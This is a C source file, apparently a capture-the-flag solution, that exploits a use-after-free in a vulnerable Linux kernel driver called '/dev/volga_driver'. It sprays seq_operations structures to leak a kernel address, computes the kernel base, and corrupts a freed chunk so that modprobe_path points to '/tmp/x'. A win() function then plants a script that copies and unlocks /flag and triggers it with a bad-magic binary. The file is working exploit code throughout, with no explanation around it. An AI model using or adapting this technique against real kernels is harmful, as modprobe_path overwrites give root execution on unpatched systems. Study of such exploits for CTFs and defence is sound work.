#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdarg.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>

// commands

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
} while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
    if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
unsigned long user_cs,user_ss,user_sp,user_rflags;

void shell(void)
{
    char *argv[] = {"/bin/sh",NULL};
    char *envp[] = {NULL};
    execve("/bin/sh",argv,envp);
}


void err(const char* format, ...) {
    if (!format) {
        exit(-1);
    }
    fprintf(stderr, "%s", "\033[1;31m[!]\033[0m ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
    exit(-1);
}

void info(const char* format, ...) {
    if (!format) {
        return;
    }
    fprintf(stderr, "%s", "\033[1;31m[*]\033[0m ");

    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
}

void save_state(void)
{
    __asm__(".intel_syntax noprefix;"
            "mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_sp,rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
	info("State saved.");
}

#define READ 0x1339
#define WRITE 0x1338
#define ADD 0x1337
#define DELETE 0x133A

int64_t fd;
const char* VULN_DRV = "/dev/volga_driver";

void open_module() {
    fd = open(VULN_DRV, O_RDWR);
    if(fd < 0) {
        err("Failed to open module");
    }
    info("Open success");
}

typedef struct user_arg
{
    int idx;
    int size;
    char *in_buf;
    char *out_buf;
}arg;

void add(int idx, int size, char *content) {
    arg cmd = 
    {
        .idx = idx,
        .size = size,
        .in_buf = content,
    };
    ioctl(fd, 0x1337, &cmd);
}

void edit(int idx, int offset, char* content) {
    arg cmd = 
    {
        .idx = idx,
        .size = offset,
        .in_buf = content,
    };
    ioctl(fd, 0x1338, &cmd);
}

void show(int idx, int offset, char* content) {
    arg cmd = 
    {
        .idx = idx,
        .size = offset,
        .out_buf = content,
    };
    ioctl(fd, 0x1339, &cmd);
}

void delete(int idx) {
    arg cmd =
    {
        .idx = idx,
    };
    ioctl(fd, 0x133a, &cmd);
}

void win() {
    info("modprobe_path overwritten. Execute fake file");
    system("echo '#!/bin/sh\nchmod 777 /flag\ncp /flag /tmp/flag' > /tmp/x");
    system("chmod 777 /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/abcd");
    system("chmod 777 /tmp/abcd");
    system("/tmp/abcd");
}

int main() {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    info("Binded to 1 CPU");
    open_module();
    add(0, 0x20, "BBBB");
    delete(0);
    int seq_fd = open("/proc/self/stat", O_RDONLY);
    if(seq_fd < 0) {
        err("Can't spray seq_operations. Exit");
    } 
    unsigned long core[0x4];
    show(0, 0x20, (char*) core);
    for(int i = 0; i < 4; i++) {
        info("core[%d] | 0x%lx", i, core[i]);
    }
    unsigned long kern_base = core[0] - 0x212770;
    info("Kernel base: 0x%lx", kern_base);
    unsigned long modprobe_path = kern_base + 0x164cee0;
    info("modprobe_path: 0x%lx", modprobe_path);
    // release the seq_operations
    close(seq_fd);

    core[2] = modprobe_path; // overwrite *next in seq_operation as modprobe_path
    edit(0, 0x20, (char*) core);
    add(0, 0x20, "/tmp/x");
    add(0, 0x20, "/tmp/x"); //overwrite modprobe_path
    win();
}
